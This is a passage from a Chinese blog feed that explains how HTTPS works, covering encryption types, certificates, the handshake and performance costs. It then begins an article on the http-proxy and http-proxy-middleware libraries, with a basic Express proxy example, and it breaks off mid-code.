        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>HTTPS是在HTTP上建立SSL加密层，并对传输数据进行加密，是HTTP协议的安全版。现在它被广泛用于万维网上安全敏感的通讯，例如交易支付方面。<br /><code>HTTPS</code>使用的是<code>TSL</code>协议（<code>SSL</code>是<code>TSL</code>协议的一种）。</p><p><a name="IOK6P"></a></p><h2 id="HTTPS的功能"><a href="#HTTPS的功能" class="headerlink" title="HTTPS的功能"></a>HTTPS的功能</h2><ul><li><strong>内容加密，</strong>对数据进行加密，并建立一个信息安全通道，来保证传输过程中的数据安全;<ul><li>非对称密钥加密：传输公钥时可能被截获并掉包，解决方案：使用第三方机构颁发的证书加密公钥（根据服务器地址等多个信息生成，无法被第三方伪造），浏览器收到后使用证书机构颁发的公钥进行解密（前提是浏览器要信任同一个证书颁发机构）解密结果与用证书生成的规则再生成一个签名对比一致就是真证书；</li><li>对称密钥加密：中间人随意截获。</li></ul></li><li><strong>身份认证，</strong>对网站服务器进行真实身份认证。<ul><li>数字证书</li></ul></li><li><strong>数据完整性</strong></li></ul><p>我们经常会在Web的登录页面和购物结算界面等使用HTTPS通信。使用HTTPS通信时，不再用<code>http://</code>，而是改用<code>https://</code>。另外，当浏览器访问HTTPS通信有效的Web网站时，浏览器的地址栏内会出现一个带锁的标记。对HTTPS的显示方式会因浏览器的不同而有所改变。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1597216775859-581b6650-dd85-4d01-8a72-07fd24a166dd.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1597216775859-581b6650-dd85-4d01-8a72-07fd24a166dd.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p><a name="cKLDt"></a></p><h2 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h2><p>发送方和接收方需要持有同一把密钥，发送消息和接收消息均使用该密钥。相对于非对称加密，对称加密具有更高的加解密速度，但双方都需要事先知道密钥，密钥在传输过程中可能会被窃取，因此安全性没有非对称加密高。</p><p><a name="x7TYm"></a></p><h2 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h2><p>接收方在发送消息前需要事先生成公钥和私钥，然后将公钥发送给发送方。发送放收到公钥后，将待发送数据用公钥加密，发送给接收方。接收到收到数据后，用私钥解密。<br />在这个过程中，公钥负责加密，私钥负责解密，数据在传输过程中即使被截获，攻击者由于没有私钥，因此也无法破解。<br />非对称加密算法的加解密速度低于对称加密算法，但是安全性更高。</p><p><a name="r3hH1"></a></p><h2 id="几个名词要理清"><a href="#几个名词要理清" class="headerlink" title="几个名词要理清"></a>几个名词要理清</h2><ul><li>RSA：非对称加密</li><li>AES：对称加密 生成一个随机字符串key 只有客户端和服务端有 他们两个通过这个key对数据加密和传输跟解密 这一个统称对称加密</li><li>CA：权威认证机构 服务器在建站的时候 去CA认证机构认证 得到对应的数字签名 相当于身份证号 客户端每次安装浏览器的时候 都会下载最新的CA列表 这个列表有对应的数字签名和服务器IP一一对应的列表 这就是为什么我们自己搭建的localhost没法发https的原因 因为没法进行CA认证</li><li>数字证书：包含了数字签名跟RSA公钥</li><li>数字签名：保证数字证书一定是服务器传给客户端的 相当于服务器的身份证ID</li><li>对称密钥： 对数据进行加密的key</li><li>非对称密钥： （k1， k2） k1加密的数据 只有k2能解开 k1位非对称公钥 k2为非对称私钥</li><li>非对称公钥：RSA公钥 k1加密的数据 只有k2能解开</li><li>非对称私钥：RSA私钥 k1加密的数据 只有k2能解开</li></ul><blockquote><p><a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)">RSA</a> 是一种广泛使用的非对称加密算法，严格来说并不等同于非对称加密，同样的对称加密算法除了 <a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">AES</a> ，还有 DES，3DES 等等。</p></blockquote><p><a name="aHLQF"></a></p><h2 id="为什么需要HTTPS"><a href="#为什么需要HTTPS" class="headerlink" title="为什么需要HTTPS"></a>为什么需要HTTPS</h2><p><strong>在HTTP协议中有可能存在信息窃取或身份伪装等安全问题。使用HTTPS通信机制可以有效地防止这些问题。</strong><br><a name="g8XiL"></a></p><h3 id="HTTP协议存在的哪些问题"><a href="#HTTP协议存在的哪些问题" class="headerlink" title="HTTP协议存在的哪些问题"></a>HTTP协议存在的哪些问题</h3><p><a name="0PUiE"></a></p><h4 id="1、通信使用明文（不加密）——内容可能被窃听"><a href="#1、通信使用明文（不加密）——内容可能被窃听" class="headerlink" title="1、通信使用明文（不加密）——内容可能被窃听"></a>1、通信使用明文（不加密）——内容可能被窃听</h4><p>由于HTTP本身不具备加密的功能，所以也无法做到对通信整体（使用HTTP协议通信的请求和响应的内容）进行加密。即，<strong>HTTP报文使用明文（指未经过加密的报文）方式发送</strong>。<br />HTTP明文协议的缺陷是导致数据泄露、数据篡改、流量劫持、钓鱼攻击等安全问题的重要原因。HTTP协议无法加密数据，所有通信数据都在网络中明文“裸奔”。通过网络的嗅探设备及一些技术手段，就可还原HTTP报文内容。<br><a name="m3zAR"></a></p><h4 id="2、无法证明报文的完整性——可能遭篡改"><a href="#2、无法证明报文的完整性——可能遭篡改" class="headerlink" title="2、无法证明报文的完整性——可能遭篡改"></a>2、无法证明报文的完整性——可能遭篡改</h4><p>所谓完整性是指信息的准确度。若无法证明其完整性，通常也就意味着无法判断信息是否准确。由于HTTP协议无法证明通信的报文完整性，因此，在请求或响应送出之后直到对方接收之前的这段时间内，即使请求或响应的内容遭到篡改，也没有办法获悉。<br />换句话说，<strong>没有任何办法确认，发出的请求&#x2F;响应和接收到的请求&#x2F;响应是前后相同的</strong>。<br><a name="3Zw9l"></a></p><h4 id="3、不验证通信方的身份——有可能遭遇伪装"><a href="#3、不验证通信方的身份——有可能遭遇伪装" class="headerlink" title="3、不验证通信方的身份——有可能遭遇伪装"></a>3、不验证通信方的身份——有可能遭遇伪装</h4><p><strong>HTTP协议中的请求和响应不会对通信方进行确认</strong>。在HTTP协议通信时，由于不存在确认通信方的处理步骤，任何人都可以发起请求。另外，服务器只要接收到请求，不管对方是谁都会返回一个响应（但也仅限于发送端的IP地址和端口号没有被Web服务器设定限制访问的前提下）<br />HTTP协议无法验证通信方身份，任何人都可以伪造虚假服务器欺骗用户，实现“钓鱼欺诈”，用户无法察觉。</p><p><a name="2EvNz"></a></p><h3 id="HTTPS协议优势"><a href="#HTTPS协议优势" class="headerlink" title="HTTPS协议优势"></a>HTTPS协议优势</h3><p>反观HTTPS协议，它比HTTP协议相比多了以下优势（下文会详细介绍）:</p><ul><li>数据隐私性：内容经过对称加密，每个连接生成一个唯一的加密密钥</li><li>数据完整性：内容传输经过完整性校验</li><li>身份认证：第三方无法伪造服务端（客户端）身份</li></ul><br /><a name="JTPVJ"></a>## HTTPS如何解决HTTP上述问题?HTTPS并非是应用层的一种新协议。只是HTTP通信接口部分用SSL和TLS协议代替而已。<br />通常，HTTP直接和TCP通信。当使用SSL时，则演变成先和SSL通信，再由SSL和TCP通信了。简言之，**所谓HTTPS，其实就是身披SSL协议这层外壳的HTTP**。<br />![image.png](https://cdn.nlark.com/yuque/0/2020/png/164572/1597216790803-23ec8d37-f653-43a3-8f99-d0f30e649fb1.png)<a name="uRu88"></a>### 1、解决内容可能被窃听的问题——加密<a name="Os7yv"></a>#### 方法1.对称加密这种方式加密和解密同用一个密钥。加密和解密都会用到密钥。**没有密钥就无法对密码解密，反过来说，任何人只要持有密钥就能解密了**。<br />以对称加密方式加密时必须将密钥也发给对方。可究竟怎样才能安全地转交？在互联网上转发密钥时，如果通信被监听那么密钥就可会落人攻击者之手，同时也就失去了加密的意义。另外还得设法安全地保管接收到的密钥。<a name="0FzwQ"></a>#### 方法2.非对称加密公开密钥加密使用一对非对称的密钥。一把叫做私有密钥，另一把叫做公开密钥。顾名思义，**私有密钥不能让其他任何人知道，而公开密钥则可以随意发布，任何人都可以获得**。<br />使用公开密钥加密方式，发送密文的一方使用**对方的公开密钥**进行加密处理，对方收到被加密的信息后，再使用自己的私有密钥进行解密。利用这种方式，不需要发送用来解密的私有密钥，也不必担心密钥被攻击者窃听而盗走。<br />![image.png](https://cdn.nlark.com/yuque/0/2020/png/164572/1591153515709-c746c4ae-13cf-4707-9668-34aa0bf433f7.png)<br />非对称加密的特点是信息传输一对多，服务器只需要维持一个私钥就能够和多个客户端进行加密通信。<br />这种方式有以下缺点：<ul><li>公钥是公开的，所以针对私钥加密的信息，黑客截获后可以使用公钥进行解密，获取其中的内容；</li><li>公钥并不包含服务器的信息，使用非对称加密算法无法确保服务器身份的合法性，存在中间人攻击的风险，服务器发送给客户端的公钥可能在传送过程中被中间人截获并篡改；</li><li>使用非对称加密<strong>在数据加密解密过程需要消耗一定时间</strong>，降低了数据传输效率；<br><a name="4LNXx"></a></li></ul><h4 id="方法3-对称加密-非对称加密-HTTPS采用这种方式"><a href="#方法3-对称加密-非对称加密-HTTPS采用这种方式" class="headerlink" title="方法3.对称加密+非对称加密(HTTPS采用这种方式)"></a>方法3.对称加密+非对称加密(HTTPS采用这种方式)</h4><p>使用对称密钥的好处是解密的效率比较快，使用非对称密钥的好处是可以使得传输的内容不能被破解，因为就算你拦截到了数据，但是没有对应的私钥，也是不能破解内容的。就比如说你抢到了一个保险柜，但是没有保险柜的钥匙也不能打开保险柜。那我们就将对称加密与非对称加密结合起来,充分利用两者各自的优势，<strong>在交换密钥环节使用非对称加密方式，之后的建立通信交换报文阶段则使用对称加密方式</strong>。<br />具体做法是：<strong>发送密文的一方使用对方的公钥进行加密处理“对称的密钥”，然后对方用自己的私钥解密拿到“对称的密钥”，这样可以确保交换的密钥是安全的前提下，使用对称加密方式进行通信</strong>。所以，HTTPS采用对称加密和非对称加密两者并用的混合加密机制。<br><a name="VxtyC"></a></p><h3 id="2、解决报文可能遭篡改问题——数字签名"><a href="#2、解决报文可能遭篡改问题——数字签名" class="headerlink" title="2、解决报文可能遭篡改问题——数字签名"></a>2、解决报文可能遭篡改问题——数字签名</h3><p>网络传输过程中需要经过很多中间节点，虽然数据无法被解密，但可能被篡改，那如何校验数据的完整性呢？—-校验数字签名。<br /><strong>数字签名有两种功效</strong>：</p><ul><li>能确定消息确实是由发送方签名并发出来的，因为别人假冒不了发送方的签名。</li><li>数字签名能确定消息的完整性,证明数据是否未被篡改过。</li></ul><p><strong>数字签名如何生成:</strong><br /><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1597216899684-3f5d4d8a-20a9-4758-96a4-9fd9216a54ca.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1597216899684-3f5d4d8a-20a9-4758-96a4-9fd9216a54ca.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br />接收者只有用发送者的公钥才能解密被加密的摘要信息，然后用HASH函数对收到的原文产生一个摘要信息，与上一步得到的摘要信息对比。如果相同，则说明收到的信息是完整的，在传输过程中没有被修改，否则说明信息被修改过，因此数字签名能够验证信息的完整性。<br />假设消息传递在Kobe，James两人之间发生。James将消息连同数字签名一起发送给Kobe，Kobe接收到消息后，通过校验数字签名，就可以验证接收到的消息就是James发送的。当然，这个过程的前提是Kobe知道James的公钥。问题的关键的是，和消息本身一样，公钥不能在不安全的网络中直接发送给Kobe,或者说拿到的公钥如何证明是James的。<br />此时就需要引入了<strong>证书颁发机构</strong>（Certificate Authority，简称CA），CA数量并不多，Kobe客户端内置了所有受信任CA的证书。CA对James的公钥（和其他信息）数字签名后生成证书。<br><a name="XZnPc"></a></p><h3 id="3、解决通信方身份可能被伪装的问题——数字证书"><a href="#3、解决通信方身份可能被伪装的问题——数字证书" class="headerlink" title="3、解决通信方身份可能被伪装的问题——数字证书"></a>3、解决通信方身份可能被伪装的问题——数字证书</h3><p>数字证书认证机构处于客户端与服务器双方都可信赖的第三方机构的立场上。<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1597216913635-98e02084-b788-4706-ad18-a16808d21158.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1597216913635-98e02084-b788-4706-ad18-a16808d21158.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br />我们来介绍一下数字证书认证机构的业务流程：</p><ul><li>服务器的运营人员向第三方机构CA提交公钥、组织信息、个人信息(域名)等信息并申请认证;</li><li>CA通过线上、线下等多种手段验证申请者提供信息的真实性，如组织是否存在、企业是否合法，是否拥有域名的所有权等;</li><li>如信息审核通过，CA会向申请者签发认证文件-证书。证书包含以下信息：申请者公钥、申请者的组织信息和个人信息、签发机构 CA的信息、有效时间、证书序列号等信息的明文，同时包含一个签名。 其中签名的产生算法：首先，使用散列函数计算公开的明文信息的信息摘要，然后，采用 CA的私钥对信息摘要进行加密，密文即签名;</li><li>客户端 Client 向服务器 Server 发出请求时，Server 返回证书文件;</li><li>客户端 Client 读取证书中的相关的明文信息，采用相同的散列函数计算得到信息摘要，然后，利用对应 CA的公钥解密签名数据，对比证书的信息摘要，如果一致，则可以确认证书的合法性，即服务器的公开密钥是值得信赖的。</li><li>客户端还会验证证书相关的域名信息、有效时间等信息; 客户端会内置信任CA的证书信息(包含公钥)，如果CA不被信任，则找不到对应 CA的证书，证书也会被判定非法。</li></ul><p><a name="VnaZj"></a></p><h2 id="HTTPS工作流程"><a href="#HTTPS工作流程" class="headerlink" title="HTTPS工作流程"></a>HTTPS工作流程</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1591153548973-72bc5b03-f83e-4856-ae4d-b635d6226251.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1591153548973-72bc5b03-f83e-4856-ae4d-b635d6226251.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>1.Client发起一个HTTPS（比如<code>[https://juejin.im/user/5a9a9cdcf265da238b7d771c](https://juejin.im/user/5a9a9cdcf265da238b7d771c)</code>）的请求，根据RFC2818的规定，Client知道需要连接Server的443（默认）端口。<br />2.Server把事先配置好的公钥证书（public key certificate）返回给客户端。<br />3.Client验证公钥证书：比如是否在有效期内，证书的用途是不是匹配Client请求的站点，是不是在CRL吊销列表里面，它的上一级证书是否有效，这是一个递归的过程，直到验证到根证书（操作系统内置的Root证书或者Client内置的Root证书）。如果验证通过则继续，不通过则显示警告信息。<br />4.Client使用伪随机数生成器生成加密所使用的对称密钥，然后用证书的公钥加密这个对称密钥，发给Server。<br />5.Server使用自己的私钥（private key）解密这个消息，得到对称密钥。至此，Client和Server双方都持有了相同的对称密钥。<br />6.Server使用对称密钥加密“明文内容A”，发送给Client。<br />7.Client使用对称密钥解密响应的密文，得到“明文内容A”。<br />8.Client再次发起HTTPS的请求，使用对称密钥加密请求的“明文内容B”，然后Server使用对称密钥解密密文，得到“明文内容B”。</p><p><a name="uWHqy"></a></p><h2 id="HTTPS-工作原理"><a href="#HTTPS-工作原理" class="headerlink" title="HTTPS 工作原理"></a>HTTPS 工作原理</h2><p>HTTPS在传输数据之前需要客户端（浏览器）与服务端（网站）之间进行一次握手，在握手过程中将确立双方加密传输数据的密码信息。TLS&#x2F;SSL协议不仅仅是一套加密传输的协议，更是一件经过艺术家精心设计的艺术品，TLS&#x2F;SSL中使用了非对称加密，对称加密以及HASH算法。握手过程的简单描述如下：</p><ul><li>浏览器将自己支持的一套加密规则发送给网站。</li><li>网站从中选出一组加密算法与HASH算法，并将自己的身份信息以证书的形式发回给浏览器。证书里面包含了网站地址，加密公钥，以及证书的颁发机构等信息。</li><li>获得网站证书之后浏览器要做以下工作：<ul><li>a) 验证证书的合法性（颁发证书的机构是否合法，证书中包含的网站地址是否与正在访问的地址一致等），如果证书受信任，则浏览器栏里面会显示一个小锁头，否则会给出证书不受信的提示。</li><li>如果证书受信任，或者是用户接受了不受信的证书，浏览器会生成一串随机数的密码，并用证书中提供的公钥加密。</li><li>使用约定好的HASH计算握手消息，并使用生成的随机数对消息进行加密，最后将之前生成的所有信息发送给网站。</li></ul></li><li>4.网站接收浏览器发来的数据之后要做以下的操作：<ul><li>a) 使用自己的私钥将信息解密取出密码，使用密码解密浏览器发来的握手消息，并验证HASH是否与浏览器发来的一致。</li><li>b) 使用密码加密一段握手消息，发送给浏览器。</li></ul></li><li>5.浏览器解密并计算握手消息的HASH，如果与服务端发来的HASH一致，此时握手过程结束，之后所有的通信数据将由之前浏览器生成的随机密码并利用对称加密算法进行加密。</li></ul><p><a name="cLzva"></a></p><h2 id="HTTP-与-HTTPS-的区别"><a href="#HTTP-与-HTTPS-的区别" class="headerlink" title="HTTP 与 HTTPS 的区别"></a>HTTP 与 HTTPS 的区别</h2><ul><li>HTTP 是明文传输协议，HTTPS 协议是由 SSL+HTTP 协议构建的可进行加密传输、身份认证的网络协议，比 HTTP 协议安全。</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1597216926835-99e5026c-69dd-4034-9ab9-17678d8b24b8.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1597216926835-99e5026c-69dd-4034-9ab9-17678d8b24b8.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br />关于安全性，用最简单的比喻形容两者的关系就是卡车运货，HTTP下的运货车是敞篷的，货物都是暴露的。而https则是封闭集装箱车，安全性自然提升不少。</p><ul><li>HTTPS比HTTP更加安全，对搜索引擎更友好，利于SEO,谷歌、百度优先索引HTTPS网页;</li><li>HTTPS需要用到SSL证书，而HTTP不用;</li><li>HTTPS标准端口443，HTTP标准端口80;</li><li>HTTPS基于传输层，HTTP基于应用层;</li><li>HTTPS在浏览器显示绿色安全锁，HTTP没有显示。</li></ul><p><a name="RSZOV"></a></p><h2 id="HTTPS的使用成本"><a href="#HTTPS的使用成本" class="headerlink" title="HTTPS的使用成本"></a>HTTPS的使用成本</h2><p><code>HTTPS</code>是一个大趋势</p><ul><li><strong>证书费用以及更新维护</strong><ul><li>证书现在不贵，也有免费的；</li></ul></li><li><strong>HTTPS降低用户访问速度</strong><ul><li>经过合理的优化（比如<code>SPDY</code>）和部署甚至可以比<code>HTTP1.0</code>快，不过这也是成本之一就是了；</li></ul></li><li><strong>消耗CPU资源，需要增加大量机器</strong><ul><li>需要多次计算</li></ul></li></ul><p><a name="eDb4S"></a></p><h2 id="HTTPS对性能的影响"><a href="#HTTPS对性能的影响" class="headerlink" title="HTTPS对性能的影响"></a>HTTPS对性能的影响</h2><ul><li><strong>协议交互所增加的网络RTP（往返时延）</strong></li><li><strong>加解密相关计算的耗时</strong><br><a name="CyevJ"></a></li></ul><h3 id="网络耗时"><a href="#网络耗时" class="headerlink" title="网络耗时"></a>网络耗时</h3><p><code>HTTP</code>只需要通过<code>TCP</code>的三次握手就能建立<code>HTTP</code>连接：<br />[<img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1588932715395-4e136e9c-a03c-4aad-8973-bdf85ec06d43.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1588932715395-4e136e9c-a03c-4aad-8973-bdf85ec06d43.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br />关于<code>302</code>自动跳转，这是因为，比如访问百度，我们输入网址全称而是输入<code>baidu.com</code>，所以会自动跳转至<code>HTTPS</code>，这本身也需要耗时；<br />并且跳转后，<code>URI</code>不一样了，浏览器要与服务器重新通过三次握手建立<code>TCP</code>连接；<br />之后还要进行<code>TLS</code>协商，比如密钥交换算法，对称加密算法，内容一致性校验算法，证书签名算法等等；浏览器获取到证书后，也需要校验证书的有效性，比如证书是否过期，是否撤销等等；<br />接着，浏览器首先获取证书里的<code>CA</code>域名如果该<code>CA</code>域名没有命中缓存，浏览器需要解析域名的<code>DNS</code>，这个<code>DNS</code>解析至少耗费一个<code>RTP</code>；<br /><code>DNS</code>解析到<code>IP</code>之后就要完成三次握手，建立<code>CA</code>站点的<code>TCP</code>连接，这又耗费一个<code>RTP</code>；<br />再接着浏览器发送<code>OCSP</code>请求，获取响应耗费一个<code>RTP</code>；</p><blockquote><p>关于<code>OCSP</code>：在线证书状态协议，它是维护服务器和其他网络资源安全性的两种普遍模式之一，另外一个叫做<code>CRL</code>证书注销列表；当用户试图访问一个服务器的时候，在线证书状态协议发送一个对于证书状态信息的请求，服务器会回复一个有效、过期、未知的响应；协议规定了服务器和客户端应用程序通信的语法；在线证书协议给了用户到期证书一个宽限期，这样用户就可以在更新证书前的一段时间继续访问服务器，所以这里就需要发起一个对于证书状态的请求，也需要消耗一个<code>RTP</code></p></blockquote><p>最后就是<code>TLS</code>完全握手阶段<code>2</code>，这个阶段主要进行密钥协商，耗时一个<code>RTP</code>；随后进行应用层的<code>TCP</code>数据通信。<br><a name="9QRd7"></a></p><h3 id="计算耗时"><a href="#计算耗时" class="headerlink" title="计算耗时"></a>计算耗时</h3><ul><li>浏览器计算耗时；</li><li>服务器计算耗时。</li></ul><p><a name="qwoNX"></a></p><h2 id="HTTPS常见问题"><a href="#HTTPS常见问题" class="headerlink" title="HTTPS常见问题"></a>HTTPS常见问题</h2><ul><li><code>HTTPS</code>需要安装证书；</li><li>大型网站比如百度，从<code>HTTP</code>升级为<code>HTTPS</code>比较困难（不能因为升级而降低用户体验这样就本末倒置了）；</li><li><code>HTTPS</code>并不能解决所有安全问题（比如<code>XSS</code>攻击，木马等），只是能更加安全的传输数据。</li></ul><p><a name="JsaBH"></a></p><h2 id="影响HTTP网络请求的因素"><a href="#影响HTTP网络请求的因素" class="headerlink" title="影响HTTP网络请求的因素"></a>影响HTTP网络请求的因素</h2><ul><li><strong>带宽</strong></li><li><strong>延迟</strong><ul><li>一条连接上只可发送<strong>一个</strong>请求；</li><li>请求只能从<strong>客户端开始</strong>，客户端不可以接收除响应以外的指令；</li><li>请求&#x2F;响应头部<strong>不经压缩</strong>就发送，每次互相发送<strong>相同</strong>的头部造成的浪费很多；</li><li>非强制压缩发送；</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 面试 </category>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 浏览器 </tag>
            
            <tag> 面试 </tag>
            
            <tag> 原理 </tag>
            
            <tag> Https </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>http-proxy 源码解析以及实现</title>
      <link href="/2019/07/08/frontend/browser/http-proxy-yuan-ma-jie-xi-yi-ji-shi-xian/"/>
      <url>/2019/07/08/frontend/browser/http-proxy-yuan-ma-jie-xi-yi-ji-shi-xian/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="08bd9bc4"></a></p><h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>这段时间公司进行了前后端的分离，分离开发是如丝般顺滑了，但是却带来一个问题，接口的跨域，会在调试中带来麻烦。<br />现阶段接口跨域的3中方式。<br />1.jsonp<br />2.cors<br />3.代理<br />代理（英语：Proxy）也称网络代理，是一种特殊的网络服务，允许一个网络终端（一般为客户端）通过这个服务与另一个网络终端（一般为服务器）进行非直接的连接。一些网关、路由器等网络设备具备网络代理功能。一般认为代理服务有利于保障网络终端的隐私或安全，防止攻击。</p><p><a name="cad80607"></a></p><h2 id="代理分类"><a href="#代理分类" class="headerlink" title="代理分类"></a>代理分类</h2><p><strong>1.正向代理</strong><br />正向代理，意思是一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。</p><p><strong>2.反向代理</strong><br />反向代理（Reverse Proxy）方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。</p><p><a name="c74360c9"></a></p><h2 id="图解代理"><a href="#图解代理" class="headerlink" title="图解代理"></a>图解代理</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1589178555714-a0737d00-d3b0-4d93-b556-8b2e940c4fe6.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1589178555714-a0737d00-d3b0-4d93-b556-8b2e940c4fe6.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1589178555777-9e122eae-ed24-4c51-a909-7fe004df403e.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1589178555777-9e122eae-ed24-4c51-a909-7fe004df403e.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p>正向代理即是客户端代理, 代理客户端, 服务端不知道实际发起请求的客户端。<br />反向代理即是服务端代理, 代理服务端, 客户端不知道实际提供服务的服务端。<br />如果以上没看明白可以看下面：<br /><strong>正向代理</strong>：我想去买小明水果，但是我自己懒得去买，我通过一个中介的去帮我跑腿买，即是正向代理，小明水果并不需要知道，我来买水果了。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1589178555752-aa6efb9e-965a-4365-9376-ee6a5c82beea.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1589178555752-aa6efb9e-965a-4365-9376-ee6a5c82beea.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>反向代理</strong>：而在反向代理中，我想吃苹果，我还是懒得去买，但是我和中介说，我想吃苹果，我不关心吃什么苹果，你只要给我拿到一个苹果。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1589178555614-5fb627f6-c290-4545-a98f-55fc26645404.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1589178555614-5fb627f6-c290-4545-a98f-55fc26645404.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="dae4f3ea"></a></p><h2 id="项目中的代理"><a href="#项目中的代理" class="headerlink" title="项目中的代理"></a>项目中的代理</h2><p><a name="h9yEh"></a></p><h4 id="http-proxy-middleware"><a href="#http-proxy-middleware" class="headerlink" title="http-proxy-middleware"></a>http-proxy-middleware</h4><p>这个插件正是我们公司在项目中用到的代理插件，他支持connect, express and browser-sync，应该来说非常方便，下面是他的使用方式。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> proxy = <span class="built_in">require</span>(<span class="string">&#x27;http-proxy-middleware&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/api&#x27;</span>, <span class="title function_">proxy</span>(&#123;<span class="attr">target</span>: <span class="string">&#x27;http://www.example.org&#x27;</span>, <span class="attr">changeOrigin</span>: <span class="literal">true</span>&#125;));</span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure><p>查看他的部分源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _ = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> httpProxy = <span class="built_in">require</span>(<span class="string">&#x27;http-proxy&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> configFactory = <span class="built_in">require</span>(<span class="string">&#x27;./config-factory&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> handlers = <span class="built_in">require</span>(<span class="string">&#x27;./handlers&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> contextMatcher = <span class="built_in">require</span>(<span class="string">&#x27;./context-matcher&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">PathRewriter</span> = <span class="built_in">require</span>(<span class="string">&#x27;./path-rewriter&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Router</span> = <span class="built_in">require</span>(<span class="string">&#x27;./router&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> logger = <span class="built_in">require</span>(<span class="string">&#x27;./logger&#x27;</span>).<span class="title function_">getInstance</span>()</span><br><span class="line"><span class="keyword">var</span> getArrow = <span class="built_in">require</span>(<span class="string">&#x27;./logger&#x27;</span>).<span class="property">getArrow</span></span><br><span class="line">...省略</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="title class_">HttpProxyMiddleware</span></span><br></pre></td></tr></table></figure><p>通过看到他的代码得知他用到了http-proxy这个库。</p><p><a name="S106F"></a></p><h4 id="http-proxy"><a href="#http-proxy" class="headerlink" title="http-proxy"></a>http-proxy</h4><p>那我们就来看http-proxy</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 